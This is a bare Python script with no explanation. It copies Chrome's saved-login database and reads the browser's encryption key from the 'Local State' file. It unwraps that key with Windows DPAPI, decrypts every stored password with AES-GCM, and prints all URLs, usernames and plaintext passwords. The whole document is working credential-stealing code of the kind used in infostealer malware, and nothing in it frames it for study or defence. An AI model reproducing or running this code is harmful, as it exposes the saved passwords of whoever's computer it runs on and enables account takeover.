import shutil, os, sqlite3, json, base64, win32crypt, Crypto.Cipher.AES
def decrypt(pw, key) -> str:
    try:
        return Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_GCM, pw[3:15]).decrypt(pw[15:])[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1])
        except:
            return ""
shutil.copyfile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data"), "ChromeData.db")
with sqlite3.connect("ChromeData.db") as db:
    cursor = db.cursor()
    with open(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State"), "r", encoding="utf-8") as f:
        key = win32crypt.CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    print([[row[0], row[1], row[2], decrypt(row[3], key)] for row in cursor.fetchall()])
    cursor.close()

